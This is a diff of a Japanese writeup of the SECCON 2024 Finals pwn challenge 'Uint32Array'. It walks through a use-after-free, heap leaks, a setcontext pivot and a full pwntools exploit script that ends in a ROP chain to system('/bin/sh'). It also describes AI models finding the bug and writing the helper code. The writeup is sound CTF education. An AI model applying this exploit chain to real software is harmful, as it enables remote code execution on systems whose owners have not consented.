@@ -1,6 +1,13 @@
-今年もSECCON FinalsにDouble Lariatとして出てきました。
-競技修了からだいぶ経ってしまい普通に書いても今更感が強いので、「AIを使ってどこまで効率化できるか」をテーマに書いていきます。実際の競技でもAIを使って色々したので、その辺りも書いていきます。
-JeopartyのPwn、Uint32Arrayの解説をします。
+---
+layout: page
+title: SECCON 2024 Final
+parent: CTF Writeups
+nav_order: 7
+---
+
+今年も SECCON Finals に Double Lariat として出てきました。
+競技修了からだいぶ経ってしまい普通に書いても今更感が強いので、「AI を使ってどこまで効率化できるか」をテーマに書いていきます。実際の競技でも AI を使って色々したので、その辺りも書いていきます。
+Jeoparty の Pwn、Uint32Array の解説をします。
 
 # Uint32Array
 
@@ -117,7 +124,7 @@ int main() {
 }
 ```
 
-まず、o1 proに脆弱性の発見を行ってもらいます。
+まず、o1 pro に脆弱性の発見を行ってもらいます。
 
 ```
 arr = Uint32Array(size); の代入時、デフォルトのコピー代入演算子が「ポインタのシャローコピー」を行うため、
@@ -125,20 +132,20 @@ arr = Uint32Array(size); の代入時、デフォルトのコピー代入演算�
 これにより Use-After-Free（および二重解放）の脆弱性が生じる。
 ```
 
-ホーン。確かに。しかもsizeがある程度自由に設定できるので、任意のオブジェクトを重ねることができそうです。
+ホーン。確かに。しかも size がある程度自由に設定できるので、任意のオブジェクトを重ねることができそうです。
 
-次に、Claude 3.7 Sonnet(thinking) に設定されたRoo Codeにヘルパーを書いてもらいます。
+次に、Claude 3.7 Sonnet(thinking) に設定された Roo Code にヘルパーを書いてもらいます。
 
 ```python
 def set_value(sock, index, value):
     """
     指定されたインデックスに値を設定するヘルパー関数
-    
+
     Args:
         sock: ソケット（pwntools processオブジェクト）
         index: 設定するインデックス
         value: 設定する値
-    
+
     Returns:
         成功した場合はTrue、失敗した場合はFalse
     """
@@ -157,11 +164,11 @@ def set_value(sock, index, value):
 def get_value(sock, index):
     """
     指定されたインデックスの値を取得するヘルパー関数
-    
+
     Args:
         sock: ソケット（pwntools processオブジェクト）
         index: 取得するインデックス
-    
+
     Returns:
         成功した場合は値、失敗した場合はNone
     """
@@ -181,12 +188,12 @@ def get_value(sock, index):
 def set_value_recovery(sock, index, value):
     """
     リカバリーモードで値を設定するヘルパー関数
-    
+
     Args:
         sock: ソケット（pwntools processオブジェクト）
         index: 設定するインデックス
         value: 設定する値
-    
+
     Returns:
         成功した場合はTrue、失敗した場合はFalse
     """
@@ -194,7 +201,7 @@ def set_value_recovery(sock, index, value):
         # インデックスを入力
         sock.sendlineafter(b"index = ", str(index).encode())
         # 値を入力
-        sock.sendlineafter(b"value = ", str(value).encode()) 
+        sock.sendlineafter(b"value = ", str(value).encode())
         return True
     except Exception as e:
         print(f"[!] set_value_recovery failed: {e}")
@@ -203,12 +210,12 @@ def set_value_recovery(sock, index, value):
 def trigger_recovery_mode(sock, enter = True, out_of_bounds_index=100, value=0x41414141):
     """
     リカバリーモードをトリガーするヘルパー関数
-    
+
     Args:
         sock: ソケット（pwntools processオブジェクト）
         out_of_bounds_index: 範囲外のインデックス（デフォルト: 100）
         value: 設定する値（デフォルト: 0x41414141）
-    
+
     Returns:
         成功した場合はTrue、失敗した場合はFalse
     """
@@ -232,7 +239,7 @@ def trigger_recovery_mode(sock, enter = True, out_of_bounds_index=100, value=0x4
 
 ```
 
-double freeが発生したあと、実際にどんなサイズのmallocが走るのか見ていきます。サイズによっては、arrを重ねて変な操作ができるかもしれません。
+double free が発生したあと、実際にどんなサイズの malloc が走るのか見ていきます。サイズによっては、arr を重ねて変な操作ができるかもしれません。
 
 ```python
 p = gdb.debug("./main_patch", gdbscript="""
@@ -248,7 +255,7 @@ p.sendlineafter(b'size = ', b'10')
 p.interactive()
 ```
 
-適当なガチャガチャをしていると、例外発生時にmallocが走ります。ヒープの状態を見ると次のようになっていました。
+適当なガチャガチャをしていると、例外発生時に malloc が走ります。ヒープの状態を見ると次のようになっていました。
 
 ```
 (...)
@@ -290,21 +297,21 @@ pwndbg> tel 0x651e9ce50760
 
 ```
 
-サイズ0x40は`std::string`か`std::out_of_range`っぽいですね。"out-of-bounds access"という文字列が入っています。
-サイズ0xA0は何かわかりませんが、関数ポインタが沢山乗っています。
+サイズ 0x40 は`std::string`か`std::out_of_range`っぽいですね。"out-of-bounds access"という文字列が入っています。
+サイズ 0xA0 は何かわかりませんが、関数ポインタが沢山乗っています。
 
-とりあえず、0xA0の方に`arr`を重ねてみましょう。36個の要素を持つUint32Arrayを作成するとちょうど0xA0サイズのチャンクが作られます。
-最初の処理でそれが開放され、例外発生時に0xA0が再度確保され、そこに各種例外用の値がセットされることになります。
+とりあえず、0xA0 の方に`arr`を重ねてみましょう。36 個の要素を持つ Uint32Array を作成するとちょうど 0xA0 サイズのチャンクが作られます。
+最初の処理でそれが開放され、例外発生時に 0xA0 が再度確保され、そこに各種例外用の値がセットされることになります。
 
 つまり、
 
-1. 36個の要素を持つUint32Arrayを作成
+1. 36 個の要素を持つ Uint32Array を作成
 2. 例外を発生させる
-3. get_valueでバッファの内容をリーク
+3. get_value でバッファの内容をリーク
 
 これで、ヒープの状態を見ることができます。
 
-AIに`get_valueの値を64bitにして配列に入れて〜`と頼むとよしなにコード生成してくれます。
+AI に`get_valueの値を64bitにして配列に入れて〜`と頼むとよしなにコード生成してくれます。
 
 ```python
 # Collect freed values
@@ -382,8 +389,8 @@ pwndbg> tel 0x5a44fe9716c0 20
 13:0098│  0x5a44fe971758 —▸ 0x5a44fe971788 ◂— 'out-of-bounds access'
 ```
 
-これにより、libstdc++やlibc、ヒープなどの値をリークすることができました（libstdc++とlibcの配置は隣接することに注意）。オフセット等を適当に計算し、ベースアドレスも手に入れることができます。
-さて、exploitパートです。
+これにより、libstdc++や libc、ヒープなどの値をリークすることができました（libstdc++と libc の配置は隣接することに注意）。オフセット等を適当に計算し、ベースアドレスも手に入れることができます。
+さて、exploit パートです。
 
 利用するのはここ
 
@@ -400,7 +407,7 @@ if (choice == 1) {
 ```
 
 リカバリーモードに入ると、一度だけ`arr`に値を書き込むことができます。関数ポインタが沢山あるので、色々書き換えることでクラッシュさせてその時の様子を観察しましょう。
-AIに頼みます。
+AI に頼みます。
 
 ```python
 def inner(write_idx):
@@ -420,11 +427,11 @@ for idx in range(0, 36, 2):
 
 やりたいことを察し、全体をラップしてくれました。偉いですね。
 
-実行すると、オフセット`6`と`26`に値を書き込むと、それがちょうど関数ポインタになっているようです。RIPの下位32bitが0xdeadbeefになりSEGFAULTで落ちます。RIPが取れたのでこれを使ってシェルを取得していきます。
+実行すると、オフセット`6`と`26`に値を書き込むと、それがちょうど関数ポインタになっているようです。RIP の下位 32bit が 0xdeadbeef になり SEGFAULT で落ちます。RIP が取れたのでこれを使ってシェルを取得していきます。
 
-単純なone_gadgetは全て試してみましたが、条件の合うものはなく、地道に進めていくことにします。
+単純な one_gadget は全て試してみましたが、条件の合うものはなく、地道に進めていくことにします。
 
-6のときのレジスタはこんな感じ。
+6 のときのレジスタはこんな感じ。
 
 ```
 pwndbg> regs
@@ -447,7 +454,7 @@ pwndbg> regs
  RIP  0x7512deadbeef
 ```
 
-26だとこう
+26 だとこう
 
 ```
 pwndbg> regs
@@ -470,8 +477,8 @@ pwndbg> regs
  RIP  0x7d39deadbeef
 ```
 
-6だとRDIがヒープに向いているので、getsなど第一引数にバッファを取る系の関数だと非常に相性が良さそうです。
-ただし、cinによる値の読み込みはscanf("%d")などと同様、数値を読み込んだ際に改行文字のクリアなどを行わないため、直後にgetsを使う場合改行コードで終了してしまうことがあります。
+6 だと RDI がヒープに向いているので、gets など第一引数にバッファを取る系の関数だと非常に相性が良さそうです。
+ただし、cin による値の読み込みは scanf("%d")などと同様、数値を読み込んだ際に改行文字のクリアなどを行わないため、直後に gets を使う場合改行コードで終了してしまうことがあります。
 値の送信時、改行コードを手動で送るようにして対策します。
 
 ```python
@@ -527,10 +534,10 @@ pwndbg> tel 0x5f380722c6c0 40
 しかし、書き込み先バッファは`std::out_of_range`構造体で上書きされてしまうため、単純に`system("/bin/sh")`を呼び出すことはできません。
 
 ここで、バッファに`ucontext_t`、関数ポインタに`setcontext`を設定することでシェルを取得することを考えます。
-ただ、実際に試してみるとrdiレジスタに相当する値が、色々な処理で`0`で上書きされてしまうため、`rip=system && rdi="/bin/sh"`という形でシェルを取得することはできません。
-実験の結果、rspは自由に設定することができるので、これをヒープに向けておき最後にROPをすることでシェルを取得し、問題を解くことができました。
+ただ、実際に試してみると rdi レジスタに相当する値が、色々な処理で`0`で上書きされてしまうため、`rip=system && rdi="/bin/sh"`という形でシェルを取得することはできません。
+実験の結果、rsp は自由に設定することができるので、これをヒープに向けておき最後に ROP をすることでシェルを取得し、問題を解くことができました。
 
-最終的なexploitは以下のようになります。
+最終的な exploit は以下のようになります。
 
 ```python
 #!/usr/bin/env python3
@@ -543,7 +550,7 @@ context.arch = "amd64"
 
 libc = ELF("./libs/libc.so.6")
 
-def exploit(): 
+def exploit():
     # def inner(arg, use_gdb=False):
     def inner(use_gdb=False):
         if use_gdb:
@@ -568,13 +575,13 @@ def exploit():
                 val64 = (high << 32) | low
                 # print(f"[{2*i}:{2*i+1}] = {hex(val64)}")
                 memory.append(val64)
-        
+
         binary_base = memory[2] - 0x3cc8 # typeinfo for std::out_of_range@GLIBCXX_3.4
         libstdcpp_base = memory[3] - 0xd2100 # out of range
         some_heap_addr = memory[11] - 0x12b50
         stack = memory[15]
         libc_base = libstdcpp_base - 0x240000
-        
+
         info(f"binary_base: {hex(binary_base)}")
         info(f"libstdcpp_base: {hex(libstdcpp_base)}")
         info(f"heap one: {hex(some_heap_addr)}")
@@ -582,42 +589,42 @@ def exploit():
         info(f"libc_base: {hex(libc_base)}")
 
         assert libc_base & 0xfff == 0；
-        
+
         libc.address = libc_base
 
         gets = libc.symbols['gets']
         system = libc.symbols['system']
         setcontext = libc.symbols['setcontext']
-        
+
         # rop gadgets
         ret = libc_base + 0x000000000002882f
         pop_rdi = libc_base + 0x000000000010f75b
         bin_sh = next(libc.search(b"/bin/sh\x00"))
-         
+
         trigger_recovery_mode(p, enter=True)
         set_value_recovery(p, 6, gets & 0xffffffff) # overwrite function pointer
         # set_value_recovery(p, 6, 0xdeadbeef)
-        
+
         rop_start_offset = 0x100
         payload = create_ucontext(src=some_heap_addr + 0x12b50, rsp=some_heap_addr + 0x12b50 + rop_start_offset, rip=ret)
-        
+
         padding_for_heap = pack(1) * 11 + pack(0xe461) # top size
         print(f'length of padding is {hex(len(padding_for_heap))}')
-        
+
         payload[0: len(padding_for_heap)] = padding_for_heap
-        
+
         rop = b""
         rop += pack(pop_rdi)
         rop += pack(bin_sh)
         rop += pack(system)
-        
+
         payload[rop_start_offset: ] = rop
-        
+
         p.sendline(payload)
-        
+
         trigger_recovery_mode(p, enter=True)
         set_value_recovery(p, 6, setcontext & 0xffffffff) # overwrite function pointer
-        
+
         p.sendline(b"")
 
         sleep(1)
@@ -628,7 +635,7 @@ def exploit():
         p.sendline(b"cat /flag*")
 
         p.interactive()
-        
+
     inner(use_gdb=True)
 
 def create_ucontext(
@@ -673,12 +680,12 @@ def create_ucontext(
 def set_value(sock, index, value):
     """
     指定されたインデックスに値を設定するヘルパー関数
-    
+
     Args:
         sock: ソケット（pwntools processオブジェクト）
         index: 設定するインデックス
         value: 設定する値
-    
+
     Returns:
         成功した場合はTrue、失敗した場合はFalse
     """
@@ -697,11 +704,11 @@ def set_value(sock, index, value):
 def get_value(sock, index):
     """
     指定されたインデックスの値を取得するヘルパー関数
-    
+
     Args:
         sock: ソケット（pwntools processオブジェクト）
         index: 取得するインデックス
-    
+
     Returns:
         成功した場合は値、失敗した場合はNone
     """
@@ -721,12 +728,12 @@ def get_value(sock, index):
 def set_value_recovery(sock, index, value):
     """
     リカバリーモードで値を設定するヘルパー関数
-    
+
     Args:
         sock: ソケット（pwntools processオブジェクト）
         index: 設定するインデックス
         value: 設定する値
-    
+
     Returns:
         成功した場合はTrue、失敗した場合はFalse
     """
@@ -743,12 +750,12 @@ def set_value_recovery(sock, index, value):
 def trigger_recovery_mode(sock, enter = True, out_of_bounds_index=100, value=0x41414141):
     """
     リカバリーモードをトリガーするヘルパー関数
-    
+
     Args:
         sock: ソケット（pwntools processオブジェクト）
         out_of_bounds_index: 範囲外のインデックス（デフォルト: 100）
         value: 設定する値（デフォルト: 0x41414141）
-    
+
     Returns:
         成功した場合はTrue、失敗した場合はFalse
     """
@@ -778,15 +785,14 @@ if __name__ == "__main__":
 
 ```
 
-
 # 感想
 
-脆弱性の発見やヘルパー関数の定義、面倒な雑用などは全部AIがやってくれており、人間である私はexploitの本質部分に集中することができました。
-正直かなり便利であり、この件で AI x Pwnに可能性を見出したため個人的な研究をしています。手伝ってくれる方、ご連絡お待ちしております。
+脆弱性の発見やヘルパー関数の定義、面倒な雑用などは全部 AI がやってくれており、人間である私は exploit の本質部分に集中することができました。
+正直かなり便利であり、この件で AI x Pwn に可能性を見出したため個人的な研究をしています。手伝ってくれる方、ご連絡お待ちしております。
 
-それと、なんかRevはAIで一発だったらしいです。終わったあとの食事会で、「どの分野が最初にAIに駆逐されるか」みたいな話をしていましたが、やっぱりRevかCryptoなんですかね。門外漢なのでわかりませんが。
-Pwnは本質パートを解くための試行錯誤があり、そのためにGDBの操作を必要ですが、ClineやRoo CodeのなどのComputer UseはREPLをうまく使ってくれないのでちょっと厳しそうですね。
-
+それと、なんか Rev は AI で一発だったらしいです。終わったあとの食事会で、「どの分野が最初に AI に駆逐されるか」みたいな話をしていましたが、やっぱり Rev か Crypto なんですかね。門外漢なのでわかりませんが。
+Pwn は本質パートを解くための試行錯誤があり、そのために GDB の操作を必要ですが、Cline や Roo Code のなどの Computer Use は REPL をうまく使ってくれないのでちょっと厳しそうですね。
 
 # 余談
-First Blood取ってやるぞと思って二日目の競技開始30秒前からペイロードを飛ばしまくっていた所、数秒差でTSGのいわしさんに勝つことができました。やったぜ。
+
+First Blood 取ってやるぞと思って二日目の競技開始 30 秒前からペイロードを飛ばしまくっていた所、数秒差で TSG のいわしさんに勝つことができました。やったぜ。
